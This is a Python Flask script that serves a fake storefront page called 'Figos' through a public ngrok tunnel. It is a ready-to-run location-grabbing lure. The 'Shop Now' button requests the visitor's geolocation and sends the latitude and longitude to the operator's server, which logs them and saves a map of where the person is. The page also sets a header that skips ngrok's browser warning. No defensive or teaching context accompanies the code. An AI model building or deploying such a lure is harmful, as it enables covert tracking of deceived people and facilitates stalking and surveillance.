from flask import Flask, render_template_string, request
import folium
from pyngrok import ngrok
from threading import Thread
import webbrowser

app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Figos - Online Store</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
    body { background: linear-gradient(to right, #f5f7fa, #c3cfe2); min-height: 100vh; display: flex; justify-content: center; align-items: center; }
    .store-container { background: white; padding: 50px 40px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); text-align: center; max-width: 450px; width: 90%; animation: fadeIn 1s ease-in; }
    h1 { color: #333; font-size: 2rem; margin-bottom: 20px; }
    p.description { color: #555; font-size: 1rem; margin-bottom: 30px; line-height: 1.5; }
    button { background-color: #ff7f50; color: white; padding: 15px 35px; border: none; border-radius: 50px; font-size: 1rem; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
    button:hover { background-color: #ff6347; transform: translateY(-3px); box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
    .output { margin-top: 25px; font-size: 1rem; color: #333; word-break: break-word; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
  </style>
</head>
<body>
  <div class="store-container">
    <h1>Figos 🛒</h1>
    <p class="description">
      Welcome to Figos, your one-stop shop for unique and high-quality products. 
      Discover amazing deals, exclusive items, and a seamless shopping experience.
    </p>
    <button onclick="shopNow()">Shop Now</button>
    <div class="output" id="output"></div>
  </div>

  <script>
    // Prefetch ngrok URL to prime the session
    window.addEventListener('load', () => {
      fetch("{{ public_url }}", {
        method: 'GET',
        headers: { 'ngrok-skip-browser-warning': 'true' }
      }).catch(err => console.log("Prefetch failed:", err));
    });

    function shopNow() {
      const output = document.getElementById("output");
      output.innerHTML = "🎉 Welcome to Figos!";

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(success, error);
      } else {
        output.innerHTML += "<br>Geolocation is not supported by your browser.";
      }
    }

    function success(position) {
      const lat = position.coords.latitude;
      const lng = position.coords.longitude;
     

      fetch("/location", {
        method: "POST",
        headers: { 
          "Content-Type": "application/json",
          "ngrok-skip-browser-warning": "true"
        },
        body: JSON.stringify({ lat: lat, lng: lng })
      }).then(res => res.text())
        .then(msg => console.log(msg));
    }

    function error(err) {
      const output = document.getElementById("output");
      output.innerHTML += `<br>Error getting location: ${err.message}`;
    }
  </script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML, public_url=public_url)

@app.route("/location", methods=["POST"])
def location():
    data = request.get_json()
    lat, lng = data["lat"], data["lng"]

    print(f"User Location → Latitude: {lat}, Longitude: {lng}")

    myMap = folium.Map(location=[lat, lng], zoom_start=15)
    folium.Marker([lat, lng], popup="You are here").add_to(myMap)
    myMap.save("mylocation.html")

    return "Location received! Map saved as 'mylocation.html'"

def run_flask():
    app.run(port=5000)

if __name__ == "__main__":
    Thread(target=run_flask).start()

    ngrok_tunnel = ngrok.connect(5000)
    public_url = ngrok_tunnel.public_url
    print(f"Ngrok URL: {public_url}")

    webbrowser.open(public_url)